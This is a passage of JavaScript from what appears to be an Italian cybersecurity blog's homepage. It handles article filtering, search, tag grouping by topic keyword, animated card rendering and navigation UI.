        ${(post.tags||[]).map(t=>`<span class="tag-chip" data-tag="${t}">${t}</span>`).join('')}
      </div>
    </div>
  </article>`;
}

function catClass(cat) {
  const m = { 'red':'c-red','blue':'c-blue','storia':'c-storia','fond':'c-fond','news':'c-news' };
  return m[cat] || '';
}


/* ──────────────────────────────────────────────────────────
   ▶ STATE
   ────────────────────────────────────────────────────────── */
let activeCat = '';
let activeTag = '';
let searchQ   = '';


/* ──────────────────────────────────────────────────────────
   ▶ RENDER
   ────────────────────────────────────────────────────────── */
function getFiltered() {
  return POSTS.filter(p => {
    const catOk = !activeCat || p.cat === activeCat;
    const tagOk = !activeTag || (p.tags||[]).includes(activeTag);
    const q     = searchQ.toLowerCase().trim();
    const srchOk = !q ||
      p.title.toLowerCase().includes(q) ||
      (p.excerpt||'').toLowerCase().includes(q) ||
      (p.tags||[]).some(t=>t.toLowerCase().includes(q));
    return catOk && tagOk && srchOk;
  });
}

let listEventsBound = false;
function bindListEvents(list) {
  if (listEventsBound) return; // `list` non viene mai ricreato tra un render() e l'altro, solo il suo innerHTML
  listEventsBound = true;

  list.addEventListener('click', e => {
    const chip = e.target.closest('.tag-chip');
    if (chip) {
      e.preventDefault(); e.stopPropagation();
      const t = chip.dataset.tag;
      activeTag = activeTag === t ? '' : t;
      syncTagUI();
      render();
      return;
    }
    if (e.target.closest('a')) return;
    const card = e.target.closest('.article-card');
    if (card) {
      const href = card.querySelector('a')?.href;
      if (href) window.location.href = href;
    }
  });
}

function render() {
  const list = document.getElementById('articleList');
  const noR  = document.getElementById('noResults');
  if (!list) return;

  const filtered = getFiltered();

  // Sorted: newest first
  const sorted = [...filtered].sort((a,b) => (b.date||'').localeCompare(a.date||''));

  list.innerHTML = sorted.map(buildCard).join('');
  if (noR) noR.classList.toggle('visible', sorted.length === 0);

  // Section title
  const title = document.getElementById('articlesSectionTitle');
  if (title) {
    title.textContent = activeCat
      ? CAT_LABEL[activeCat] + ' — ' + sorted.length + ' articol' + (sorted.length===1?'o':'i')
      : 'Tutti gli articoli';
  }

  // Sidebar count
  const sc = document.getElementById('sidebarCount');
  if (sc) sc.textContent = sorted.length + ' articol' + (sorted.length===1?'o':'i');

  // Filter drawer count
  const fdb = document.getElementById('fdbCount');
  if (fdb) fdb.textContent = sorted.length;

  // Tag click e card click → navigate: un solo listener delegato su `list`
  // invece di un addEventListener per ogni tag-chip/card ad ogni render/filtro.
  bindListEvents(list);

  // Entry animation via GSAP ScrollTrigger — le card entrano con un lieve
  // tilt 3D, poi ogni attributo interno (badge → titolo → excerpt/meta →
  // tag) si "mette a fuoco" in sequenza (blur → nitido) invece di apparire
  // tutto insieme: è la stessa idea del batch fade prima usata, ma composta
  // attributo per attributo per un effetto più cinematografico.
  const cards = [...list.querySelectorAll('.article-card')];
  const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  // Le card possono essere centinaia (nessuna paginazione): animare l'ingresso
  // di tutte forza GSAP/ScrollTrigger a leggere la geometria di ognuna in un
  // solo colpo al render, causando fino a 1s+ di forced reflow sul thread
  // principale. Animiamo solo le prime (viewport + un paio di schermate sotto,
  // le uniche visibili a breve), le altre compaiono già a piena opacità.
  const ANIM_CARDS_MAX = 20;
  const animCards = cards.slice(0, ANIM_CARDS_MAX);
  cards.slice(ANIM_CARDS_MAX).forEach(card => { card.style.opacity = '1'; });

  if (!prefersReducedMotion && typeof gsap !== 'undefined' && typeof ScrollTrigger !== 'undefined' && animCards.length) {
    // render() ricrea il DOM ad ogni filtro: rimuove i trigger delle card precedenti
    ScrollTrigger.getAll().forEach(st => {
      if (st.trigger?.classList?.contains('article-card')) st.kill();
    });

    const isMobile = window.innerWidth < 768;
    const dur = isMobile ? 0.5 : 0.7;
    const stg = isMobile ? 0.055 : 0.09;

    gsap.set(animCards, {
      opacity: 0, y: 38, rotateX: -9,
      transformPerspective: 800, transformOrigin: '50% 100%',
    });
    animCards.forEach(card => {
      const subEls = [
        card.querySelector('.article-cat-badge'),
        card.querySelector('.article-title'),
        card.querySelector('.article-excerpt'),
        card.querySelector('.article-meta'),
      ].filter(Boolean);
      gsap.set(subEls, { opacity: 0, y: 12, filter: 'blur(5px)' });
      gsap.set(card.querySelectorAll('.tag-chip'), { opacity: 0, y: 6 });
    });

    ScrollTrigger.batch(animCards, {
      start: 'top 92%',
      once: true,
      batchMax: isMobile ? 3 : 6,          // meno elementi per frame su mobile
      onEnter: batch => {
        const tl = gsap.timeline();
        const clearTargets = [...batch];

        tl.to(batch, {
          opacity: 1, y: 0, rotateX: 0,
          duration: dur, ease: 'power3.out', stagger: stg, overwrite: true,
        }, 0);

        batch.forEach((card, i) => {
          const base = i * stg;
          const badge   = card.querySelector('.article-cat-badge');
          const title   = card.querySelector('.article-title');
          const excerpt = card.querySelector('.article-excerpt');
          const meta    = card.querySelector('.article-meta');
          const tags    = [...card.querySelectorAll('.tag-chip')];
          [badge, title, excerpt, meta].forEach(el => el && clearTargets.push(el));
          clearTargets.push(...tags);

          if (badge)   tl.to(badge,   { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.35, ease: 'power2.out' }, base + 0.1);
          if (title)   tl.to(title,   { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.4,  ease: 'power2.out' }, base + 0.16);
          const excMeta = [excerpt, meta].filter(Boolean);
          if (excMeta.length) tl.to(excMeta, { opacity: 1, y: 0, filter: 'blur(0px)', duration: 0.35, ease: 'power2.out', stagger: 0.04 }, base + 0.22);
          if (tags.length) tl.to(tags, { opacity: 1, y: 0, duration: 0.25, ease: 'power2.out', stagger: 0.03 }, base + 0.3);
        });

        tl.eventCallback('onComplete', () => gsap.set(clearTargets, { clearProps: 'transform,filter' }));
      },
    });
  } else {
    animCards.forEach(card => { card.style.opacity = '1'; });
  }

  cards.forEach(card => {
    let tiltRaf = null, lastEvt = null;
    card.addEventListener('mousemove', e => {
      lastEvt = e;
      if (tiltRaf) return; // un solo rAF in coda per frame: niente layout read/write ad ogni mousemove
      tiltRaf = requestAnimationFrame(() => {
        tiltRaf = null;
        const r = card.getBoundingClientRect();
        const x = (lastEvt.clientX - r.left) / r.width  - 0.5;
        const y = (lastEvt.clientY - r.top)  / r.height - 0.5;
        card.style.transform = `translateY(-5px) perspective(700px) rotateY(${x * 10}deg) rotateX(${-y * 6}deg)`;
      });
    });
    card.addEventListener('mouseleave', () => {
      if (tiltRaf) { cancelAnimationFrame(tiltRaf); tiltRaf = null; }
      card.style.transform = '';
    });
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ COUNTS (stats + categories) — con contatore animato
   ────────────────────────────────────────────────────────── */
function animateCounter(el, to, duration) {
  if (!el) return;
  const start = performance.now();
  const update = (now) => {
    const t = Math.min((now - start) / duration, 1);
    const ease = 1 - Math.pow(1 - t, 3);
    el.textContent = Math.round(ease * to);
    if (t < 1) requestAnimationFrame(update);
    else el.textContent = to;
  };
  requestAnimationFrame(update);
}

function updateCounts() {
  const counts = {};
  POSTS.forEach(p => { counts[p.cat] = (counts[p.cat]||0) + 1; });

  const map = {
    'red':    ['cnt-red','cc-red'],
    'blue':   ['cnt-blue','cc-blue'],
    'storia': ['cnt-storia','cc-storia'],
    'fond':   ['cnt-fond','cc-fond'],
    'news':   ['cnt-news','cc-news'],
  };
  Object.entries(map).forEach(([cat,[statId,catId]]) => {
    const n = counts[cat]||0;
    const se = document.getElementById(statId);
    if (se) animateCounter(se, n, 1100 + Math.random() * 400);
    const ce = document.getElementById(catId);
    if (ce) ce.textContent = n + ' articol' + (n===1?'o':'i');
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ TAGS
   ────────────────────────────────────────────────────────── */
/* ──────────────────────────────────────────────────────────
   ▶ TAG PANEL — tendina raggruppata
   ────────────────────────────────────────────────────────── */
/* Icone SVG geometriche per i gruppi — 10×10 viewBox */
const _SVG = {
  offensiva: `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M1 5 L7 5 M5 3 L7 5 L5 7"/><path d="M2.5 3.5 L3.5 5 L2.5 6.5" stroke-width="0.7" opacity="0.55"/></svg>`,
  difesa:    `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><path d="M5 1 L9 3 L9 6.5 Q9 9 5 9 Q1 9 1 6.5 L1 3 Z"/><path d="M5 3 L7.5 4.2 L7.5 6.2 Q7.5 7.8 5 7.8 Q2.5 7.8 2.5 6.2 L2.5 4.2 Z" stroke-width="0.7" opacity="0.5"/></svg>`,
  malware:   `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><path d="M3 1.5 L7 1.5 L8.5 3 L8.5 7 L7 8.5 L3 8.5 L1.5 7 L1.5 3 Z"/><circle cx="5" cy="5" r="1" fill="currentColor" stroke="none"/></svg>`,
  reti:      `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1"><path d="M5 1 L8.5 3 L8.5 7 L5 9 L1.5 7 L1.5 3 Z"/><circle cx="5" cy="5" r="1.2" fill="currentColor" stroke="none"/><line x1="5" y1="3.8" x2="5" y2="1" stroke-width="0.7"/><line x1="5" y1="6.2" x2="5" y2="9" stroke-width="0.7"/></svg>`,
  intel:     `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><circle cx="4.2" cy="4.2" r="3"/><line x1="6.6" y1="6.6" x2="9" y2="9"/><circle cx="4.2" cy="4.2" r="0.8" fill="currentColor" stroke="none"/></svg>`,
  cloud:     `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><polyline points="1,3.5 3,5 1,6.5"/><line x1="5" y1="7" x2="9" y2="7"/><line x1="5" y1="5" x2="9" y2="5"/><line x1="5" y1="3" x2="8" y2="3"/></svg>`,
  scenario:  `<svg viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><path d="M5 1 L9 5 L5 9 L1 5 Z"/><line x1="5" y1="3" x2="5" y2="7" stroke-width="0.7" opacity="0.6"/><line x1="3" y1="5" x2="7" y2="5" stroke-width="0.7" opacity="0.6"/></svg>`,
};

const TAG_GROUPS = [
  { key:'offensiva', label:'Offensiva',      color:'var(--c-red)',     svg:_SVG.offensiva },
  { key:'difesa',    label:'Difesa',          color:'var(--c-fond)',    svg:_SVG.difesa    },
  { key:'malware',   label:'Malware',         color:'#cc3355',          svg:_SVG.malware   },
  { key:'reti',      label:'Reti & Cripto',   color:'var(--accent)',    svg:_SVG.reti      },
  { key:'intel',     label:'Intelligence',    color:'var(--c-blue)',    svg:_SVG.intel     },
  { key:'cloud',     label:'Dev & Cloud',     color:'var(--c-news)',    svg:_SVG.cloud     },
  { key:'scenario',  label:'Scenario',        color:'var(--c-storia)',  svg:_SVG.scenario  },
];

function classifyTag(tag) {
  const t = tag.toLowerCase();

  /* Dev & Cloud — OS, ambienti, AI, strumenti dev */
  if (/\baws\b|\bs3\b|ci\/cd|github.action|docker|container|cspm|sicurezza.cloud|cloud.sec|\bnpm\b|crates\.io|devsec|automazione|automation|vs\.code|\brust\b|sviluppatori|secrets\b|supply.chain|bitlocker|\bintune\b|\bgpo\b|group.policy|active.directory|\bai\b|llm\b|ai.sec|ai.agent|deepfake|voice.clon|\bphp\b|powershell|sysadmin|selinux|\blinux\b|\bwindows\b|\bcron\b|systemd|sicurezza.endpoint|endpoint.sec|email.sec/.test(t)) return 'cloud';

  /* Intelligence — OSINT, recon, CTI, standard CTI, data exposure */
  if (/\bosint\b|passive.reco|active.reco|port.scan|theharv|google.dork|google.alert|\bwhois\b|brand.monit|have.i.been|dark.web|threat.intel|\bcti\b|\bmisp\b|censys|shodan|\brecon\b|header.analys|credential.leak|dati.esposti|stix\b|taxii\b|initial.access.broker|\biab\b|sector16|data.transf/.test(t)) return 'intel';

  /* Malware — famiglie, gruppi ransomware, attori, campagne */
  if (/ransomware|malware|worm\b|backdoor|\bapt\b|infostealer|wiper|\bddos\b|botnet|\bc2\b|command.and.control|raas\b|stuxnet|wannacry|cryptolock|aids.trojan|blackcat|alphv|killnet|noname|lazarus|lapsus|hacktivi|lulzsec|anonymous|state.sponsor/.test(t)) return 'malware';

  /* Offensiva — tecniche attacco, exploitation, strumenti offensivi */
  if (/\bxss\b|cross.site.scr|sql.inject|sqli\b|\brce\b|\blfi\b|\brfi\b|buffer.overflow|exploit|payload|bypass|path.travers|reverse.shell|bind.shell|web.shell|file.upload|privilege.escal|lateral.mov|\bpivot|post.exploit|persist|pass.the.hash|kerberoast|as.rep|token.impers|red.team|pentest|penetration|ethical.hack|meterpreter|msfconsole|password.crack|wordlist|rockyou|\bhydra\b|aircrack|hashcat|phish|vishing|social.engin|ingegneria.soc|pretexting|spoofing|seo.poison|\bsuid\b|\bamsi\b|scoping|reverse.engin|exploit.in|zero.day\b|misconfigur|\bgdb\b|pwndbg|checksec|metasploit|burp.suite|cobalt.strike|proxychains|chisel\b|ligolo|sshuttle|sqlmap|\bnetcat\b|wireshark|impacket|bloodhound|tunneling\b|scanning\b|\bnmap\b|\bpmkid\b/.test(t)) return 'offensiva';

  /* Difesa — blue team, SOC, detection, compliance, standard */
  if (/\bsiem\b|\bsoc\b|\bedr\b|\bids\b|\bips\b|\bwaf\b|ngfw|firewall|antivirus|defender|detection|incident.resp|\bdfir\b|forensi|memory.forensi|autopsy|volatility|triage|containment|remediat|threat.hunt|behavioral|ioc\b|ttps|mitre.att|suricata|\bsnort\b|elastic\b|honeypot|deception|sandbox|canary|blue.team|hardening|apparmor|auditd|\bufw\b|sentinelone|crowdstrike|alert.fatig|fortinet|fortigate|event.id|event.log|\bpatch\b|segment|microseg|zero.trust|beyondcorp|\bnessus\b|openvas|\bbdr\b|backup|business.cont|recovery\b|\brpo\b|\brto\b|owasp|\bcve\b|cvss|\bnist\b|nis2\b|\bgdpr\b|cis\b|compliance|direttiva|honeytok|\bnids\b|3.2.1|3-2-1|playbook|picerl|architettura.sic|fondamentali|vulnerab|privacy\b|regole\b|difensivo|\bdpc\b/.test(t)) return 'difesa';

  /* Reti & Cripto — protocolli, crittografia, identità, packet analysis */
  if (/\btcp\b|\budp\b|\bhttp\b|\bhttps\b|\btls\b|\bssl\b|\bdns\b|\bdhcp\b|\bsmb\b|\bssh\b|\bftp\b|\bsmtp\b|\bldap\b|kerberos\b|oauth|\bjwt\b|\bicmp\b|\bvpn\b|\bbgp\b|\bvlan\b|\bdmz\b|sd.wan|modello.osi|osi.model|\bpcap\b|network.analys|packet|routing|network.sec|sicurezza.di.rete|\bwifi\b|wpa2|wireless|handshake|crittograf|\baes\b|\brsa\b|\bpgp\b|\bpki\b|x\.509|hash\b|hashing|bcrypt|pbkdf2|firma.digit|simmetri|asimmetri|autent|identit|\bmfa\b|fido2|passkey|\biam\b|certificat|anycast|\bdoh\b|dkim|dmarc|\bspf\b|cia.triad|integrità|disponibil|confidenzial|\blayer\b|protocolli|\brete\b|tcp.ip|stateful|\bresolver\b|\bzone\b|\bproxy\b/.test(t)) return 'reti';

  /* Scenario — paesi, persone, eventi storici, settori, incidenti reali */
  return 'scenario';
}

function buildTagPanel() {
  const panel = document.getElementById('tagPanel');
  if (!panel) return;

  /* frequency map for sorting within groups */
  const freq = {};
  POSTS.forEach(p => (p.tags || []).forEach(t => { freq[t] = (freq[t] || 0) + 1; }));

  const allTags = [...new Set(POSTS.flatMap(p => p.tags || []))];
  const groups  = {};
  TAG_GROUPS.forEach(g => { groups[g.key] = []; });
  allTags.forEach(tag => { groups[classifyTag(tag)].push(tag); });
  Object.values(groups).forEach(arr => arr.sort((a, b) => (freq[b] || 0) - (freq[a] || 0)));

  const MAX_VISIBLE = 28;
  let delay = 0;

  const makeChip = t => {
    const d = delay; delay += 0.018;
    return `<span class="tag-chip${t === activeTag ? ' active' : ''}" data-tag="${t}" style="animation-delay:${d.toFixed(3)}s">${t}</span>`;
  };

  panel.innerHTML = TAG_GROUPS
    .filter(g => groups[g.key].length > 0)
    .map(g => {
      const tags    = groups[g.key];
      const visible = tags.slice(0, MAX_VISIBLE);
      const hidden  = tags.slice(MAX_VISIBLE);
      const more    = hidden.length > 0
        ? `<div class="tag-group-chips tag-chips-hidden" hidden>${hidden.map(makeChip).join('')}</div>
           <button class="tag-show-more" type="button" data-gkey="${g.key}">+ ${hidden.length} altri</button>`
        : '';
      return `<div class="tag-group">
        <div class="tag-group-hdr" style="color:${g.color}">${g.svg} ${g.label}</div>
        <div class="tag-group-chips">${visible.map(makeChip).join('')}</div>
        ${more}
      </div>`;
    }).join('');

  const attachChipListeners = chips => {
    chips.forEach(chip => {
      chip.addEventListener('click', () => {
        const t = chip.dataset.tag;
        activeTag = activeTag === t ? '' : t;
        syncTagUI();
        render();
        document.getElementById('articles')?.scrollIntoView({ behavior:'smooth', block:'start' });
      });
    });
  };
  attachChipListeners(panel.querySelectorAll('.tag-chip'));

  panel.querySelectorAll('.tag-show-more').forEach(btn => {
    btn.addEventListener('click', () => {
      const hiddenBlock = btn.previousElementSibling;
      hiddenBlock.removeAttribute('hidden');
      attachChipListeners(hiddenBlock.querySelectorAll('.tag-chip'));
      btn.remove();
    });
  });
}

function initTagPanel() {
  const trigger = document.getElementById('tagPanelTrigger');
  const panel   = document.getElementById('tagPanel');
  if (!trigger || !panel) return;

  /* aggiorna badge count */
  const allTags = [...new Set(POSTS.flatMap(p => p.tags || []))];
  const countEl = document.getElementById('tagPanelCount');
  if (countEl) countEl.textContent = allTags.length;

  trigger.addEventListener('click', e => {
    e.stopPropagation();
    const open = trigger.getAttribute('aria-expanded') === 'true';
    if (open) {
      trigger.setAttribute('aria-expanded', 'false');
      panel.hidden = true;
    } else {
      trigger.setAttribute('aria-expanded', 'true');
      panel.hidden = false;
      buildTagPanel();
    }
  });

  document.addEventListener('click', e => {
    if (!trigger.contains(e.target) && !panel.contains(e.target)) {
      trigger.setAttribute('aria-expanded', 'false');
      panel.hidden = true;
    }
  });
}

function buildTagsUI() {
  /* Mantiene il filter-sheet mobile; sidebar tags ora gestita dal panel */
  const allTags = [...new Set(POSTS.flatMap(p=>p.tags||[]))].sort();
  const el = document.getElementById('filterSheetTags');
  if (!el) return;
  el.innerHTML = allTags.map(t=>
    `<span class="tag-chip${t===activeTag?' active':''}" data-tag="${t}">${t}</span>`
  ).join('');
  el.querySelectorAll('.tag-chip').forEach(chip => {
    chip.addEventListener('click', () => {
      const t = chip.dataset.tag;
      activeTag = activeTag === t ? '' : t;
      syncTagUI(); render();
    });
  });
}

function syncTagUI() {
  document.querySelectorAll('.tag-chip').forEach(c => {
    c.classList.toggle('active', c.dataset.tag === activeTag);
  });
  /* ricostruisce il panel se aperto per aggiornare lo stato attivo */
  const panel = document.getElementById('tagPanel');
  const trigger = document.getElementById('tagPanelTrigger');
  if (panel && !panel.hidden && trigger?.getAttribute('aria-expanded') === 'true') {
    buildTagPanel();
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ 3D TILT — mouse tracking su stat-box e cat-card
   ────────────────────────────────────────────────────────── */
function init3DTilt() {
  /* 3D tilt su stat-box e cat-card */
  document.querySelectorAll('.stat-box, .cat-card').forEach(el => {
    let tiltRaf = null, lastEvt = null;
    const maxTilt = el.classList.contains('stat-box') ? 14 : 10;
    el.addEventListener('mousemove', e => {
      lastEvt = e;
      if (tiltRaf) return; // un solo rAF in coda per frame: niente layout read/write ad ogni mousemove
      tiltRaf = requestAnimationFrame(() => {
        tiltRaf = null;
        const r = el.getBoundingClientRect();
        const x = (lastEvt.clientX - r.left) / r.width  - 0.5;
        const y = (lastEvt.clientY - r.top)  / r.height - 0.5;
        el.style.transform =
          `perspective(500px) rotateY(${x * maxTilt}deg) rotateX(${-y * maxTilt}deg) translateZ(6px) translateY(-3px)`;
      });
    });
    el.addEventListener('mouseleave', () => {
      if (tiltRaf) { cancelAnimationFrame(tiltRaf); tiltRaf = null; }
      el.style.transform = '';
    });
  });

  /* Entry animation cat-cards (IntersectionObserver, staggered) */
  let _catN = 0;
  const catObs = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const card = entry.target;
      card.style.opacity = '';
      card.style.animationDelay = `${_catN++ * 0.09}s`;
      card.classList.add('cat-visible');
      card.addEventListener('animationend', () => {
        card.classList.remove('cat-visible');
        card.style.animationDelay = '';
      }, { once: true });
      catObs.unobserve(card);
    });
  }, { threshold: 0.08 });

  document.querySelectorAll('.cat-card').forEach(c => {
    c.style.opacity = '0';
    catObs.observe(c);
  });

  /* Entry animation sidebar-cat-btn (stagger slide-in da sinistra) */
  let _btnN = 0;
  const btnObs = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const btn = entry.target;
      btn.style.opacity = '';
      btn.style.animationDelay = `${_btnN++ * 0.06}s`;
      btn.classList.add('btn-visible');
      btn.addEventListener('animationend', () => {
        btn.classList.remove('btn-visible');
        btn.style.animationDelay = '';
      }, { once: true });
      btnObs.unobserve(btn);
    });
  }, { threshold: 0.1 });

  document.querySelectorAll('.sidebar-cat-btn').forEach(b => {
    b.style.opacity = '0';
    btnObs.observe(b);
  });
}

/* ──────────────────────────────────────────────────────────
   ▶ HERO TRANSITION — reveal radiale dal punto cliccato
   Cerchio che si espande dal centro dell'elemento cliccato fino
   a coprire tutto lo schermo (clip-path, no canvas), con un
   anello energetico che lo precede e l'etichetta di categoria
   che si mette a fuoco al centro. Ispirato alle transizioni
   "circle reveal" (clip-path radiale dal punto di click / View
   Transitions API) diffuse per i cambi tema/pagina.
   ────────────────────────────────────────────────────────── */
const HERO_COLORS = {
  red:    { bg: 'rgba(255,48,96,0.16)',  acc: '#ff3060', glow: 'rgba(255,48,96,0.55)' },
  blue:   { bg: 'rgba(32,144,255,0.16)', acc: '#2090ff', glow: 'rgba(32,144,255,0.55)' },
  storia: { bg: 'rgba(255,170,32,0.16)', acc: '#ffaa20', glow: 'rgba(255,170,32,0.55)' },
  fond:   { bg: 'rgba(0,221,136,0.16)',  acc: '#00dd88', glow: 'rgba(0,221,136,0.55)' },
  news:   { bg: 'rgba(153,85,255,0.16)', acc: '#9955ff', glow: 'rgba(153,85,255,0.55)' },
};

function buildHeroReveal(sourceEl, catKey, subText) {
  const col  = HERO_COLORS[catKey] || { bg: 'rgba(0,200,255,0.16)', acc: '#00c8ff', glow: 'rgba(0,200,255,0.55)' };
  const rect = sourceEl.getBoundingClientRect();
  const cx = rect.left + rect.width / 2;
  const cy = rect.top + rect.height / 2;
  const R  = Math.hypot(
    Math.max(cx, window.innerWidth  - cx),
    Math.max(cy, window.innerHeight - cy)
  );

  const wrap = document.createElement('div');
  wrap.className = 'hero-reveal';
  wrap.style.setProperty('--cx', `${cx}px`);
  wrap.style.setProperty('--cy', `${cy}px`);
  wrap.style.setProperty('--r',  `${R}px`);
  wrap.style.setProperty('--ring-scale', R / 5);
  wrap.style.setProperty('--acc',  col.acc);
  wrap.style.setProperty('--glow', col.glow);
  wrap.style.setProperty('--fill', col.bg);

  wrap.appendChild(Object.assign(document.createElement('div'), { className: 'hero-reveal-fill' }));
  wrap.appendChild(Object.assign(document.createElement('div'), { className: 'hero-reveal-ring' }));

  const lbl = document.createElement('div');
  lbl.className = 'hero-overlay-label';

  const lblMain = document.createElement('span');
  lblMain.className = 'hero-lbl-main';
  lblMain.textContent = CAT_LABEL[catKey] || catKey;
  lblMain.style.cssText = `color:${col.acc}; text-shadow:0 0 40px ${col.glow}, 0 0 90px ${col.glow};`;

  const lblSub = document.createElement('span');
  lblSub.className = 'hero-lbl-sub';
  lblSub.textContent = subText;
  lblSub.style.color = col.acc;

  lbl.appendChild(lblMain);
  lbl.appendChild(lblSub);
  wrap.appendChild(lbl);

  document.body.appendChild(wrap);
  // Doppio rAF: aspetta che il browser abbia dipinto lo stato iniziale prima
  // di aggiungere la classe che avvia la transizione (evita il forced reflow
  // sincrono di un getBoundingClientRect() dedicato).
  requestAnimationFrame(() => requestAnimationFrame(() => wrap.classList.add('expand')));

  setTimeout(() => { lbl.classList.add('visible', 'glitching'); }, 230);
  setTimeout(() => { lbl.classList.remove('glitching'); }, 360);

  return wrap;
}

function heroTransition(sourceEl, catKey, onReveal) {
  const wrap = buildHeroReveal(sourceEl, catKey, '[ accesso categoria ]');
  setTimeout(() => {
    onReveal?.();
    setTimeout(() => {
      wrap.style.transition = 'opacity .45s ease';
      wrap.style.opacity    = '0';
      setTimeout(() => wrap.remove(), 470);
    }, 60);
  }, 720);
}

/* Variante per navigazione a pagina esterna */
function heroPageTransition(sourceEl, catKey, href) {
  const postTitle = sourceEl.querySelector('.inf-front-title')?.textContent?.trim().slice(0, 38) || '';
  buildHeroReveal(sourceEl, catKey, postTitle ? `> ${postTitle}` : '[ caricamento articolo ]');
  setTimeout(() => { window.location.href = href; }, 780);
}

/* ──────────────────────────────────────────────────────────
   ▶ CAT FILTER
   ────────────────────────────────────────────────────────── */
function syncCatUI() {
  ['sidebarCats','filterSheetCats'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.querySelectorAll('[data-cat]').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.cat === activeCat);
    });
  });
  // Nav links
  document.querySelectorAll('[data-cat]').forEach(a => {
    if (a.tagName !== 'BUTTON') return;
  });
  // Reset button
  const rb = document.getElementById('resetFilter');
  if (rb) rb.style.display = (activeCat||activeTag) ? '' : 'none';
}

function setCategory(cat) {
  if (cat === 'fond') { window.location.href = 'fondamentali.html'; return; }
  activeCat = cat;
  activeTag = '';
  syncCatUI();
  syncTagUI();
  render();
  // Scorre sempre verso gli articoli — su desktop altrimenti sembra non succeda niente
  const el = document.getElementById('articles');
  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}


/* ──────────────────────────────────────────────────────────
   ▶ SEARCH
   ────────────────────────────────────────────────────────── */
function runSearch(q, dropdownId) {
  const dd = document.getElementById(dropdownId);
  if (!dd) return;
  if (!q.trim()) { dd.innerHTML = ''; return; }

  const results = POSTS
    .filter(p =>
      p.title.toLowerCase().includes(q.toLowerCase()) ||
      (p.tags||[]).some(t=>t.toLowerCase().includes(q.toLowerCase())) ||
      (p.excerpt||'').toLowerCase().includes(q.toLowerCase())
    )
    .slice(0, 6);

  if (!results.length) {
    dd.innerHTML = `<div class="search-result-item" style="color:var(--text-dim);cursor:default">Nessun risultato</div>`;
    return;
  }
  dd.innerHTML = results.map(p => `
    <a class="search-result-item" href="posts/${p.id}.html">
      <span class="search-result-cat ${catClass(p.cat)}">${CAT_LABEL[p.cat]||p.cat}</span>
      ${p.title}
    </a>
  `).join('');
}

function initSearch() {
  // Desktop
  const inp = document.getElementById('searchInput');
  const dd  = document.getElementById('searchDropdown');
  if (inp) {
    inp.addEventListener('input', e => { searchQ = e.target.value; render(); runSearch(searchQ,'searchDropdown'); });
    inp.addEventListener('keydown', e => {
      if (e.key==='Escape') { inp.value=''; searchQ=''; dd.innerHTML=''; render(); inp.blur(); }
    });
  }
  // Mobile
  const inpM = document.getElementById('searchInputMobile');
  if (inpM) {
    inpM.addEventListener('input', e => { searchQ = e.target.value; render(); runSearch(searchQ,'searchDropdownMobile'); });
  }
  // Close dropdown on outside click
  document.addEventListener('click', e => {
    if (!e.target.closest('#searchWrap')) {
      const d = document.getElementById('searchDropdown'); if(d) d.innerHTML='';
    }
    if (!e.target.closest('#searchMobileBar')) {
      const d = document.getElementById('searchDropdownMobile'); if(d) d.innerHTML='';
    }
  });
  // Keyboard shortcut K
  document.addEventListener('keydown', e => {
    if ((e.metaKey||e.ctrlKey) && e.key==='k') {
      e.preventDefault();
      const si = document.getElementById('searchInput');
      const sm = document.getElementById('searchMobileBar');
      if (window.innerWidth >= 920 && si) {
        si.focus(); si.select();
      } else if (sm) {
        sm.classList.add('open');
        const m = document.getElementById('searchInputMobile');
        if(m){ m.focus(); m.select(); }
      }
    }
  });
}

function initSearchToggle() {
  const btn = document.getElementById('searchToggleBtn');
  const bar = document.getElementById('searchMobileBar');
  if (!btn || !bar) return;

  const getInp = () => document.getElementById('searchInputMobile');

  /* ── CLICK (desktop + Android) ─────────────────────────
     La barra ora usa opacity/visibility invece di display:none,
     quindi l'input è sempre nel DOM → focus() sincrono funziona. */
  btn.addEventListener('click', () => {
    const open = bar.classList.toggle('open');
    btn.setAttribute('aria-expanded', String(open));
    if (open) {
      const inp = getInp();
      if (inp) inp.focus();   // sincrono nel gesto utente → funziona su iOS
    }
  });

  /* ── TOUCHEND sull'input (iOS Safari fallback) ──────────
     Se l'utente tocca direttamente l'input e la tastiera non
     appare, il touchend garantisce un focus nel contesto giusto. */
  const inp = getInp();
  if (inp) {
    inp.addEventListener('touchend', (e) => {
      e.stopPropagation();
      inp.focus();
    }, { passive: true });

    // Chiudi con Escape
    inp.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        bar.classList.remove('open');
        btn.setAttribute('aria-expanded', 'false');
        inp.value = '';
        searchQ = '';
        const dd = document.getElementById('searchDropdownMobile');
        if (dd) dd.innerHTML = '';
        render();
      }
    });
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ NAV & MOBILE DRAWER
   ────────────────────────────────────────────────────────── */
function initNav() {
  const burger  = document.getElementById('hamburger');
  const overlay = document.getElementById('navOverlay');
  const drawer  = document.getElementById('navDrawer');

  function openNav() {
    drawer?.classList.add('open');
    overlay?.classList.add('active');
    burger?.classList.add('open');
    burger?.setAttribute('aria-expanded','true');
    document.body.style.overflow = 'hidden';
  }
  function closeNav() {
    drawer?.classList.remove('open');
    overlay?.classList.remove('active');
    burger?.classList.remove('open');
    burger?.setAttribute('aria-expanded','false');
    document.body.style.overflow = '';
  }

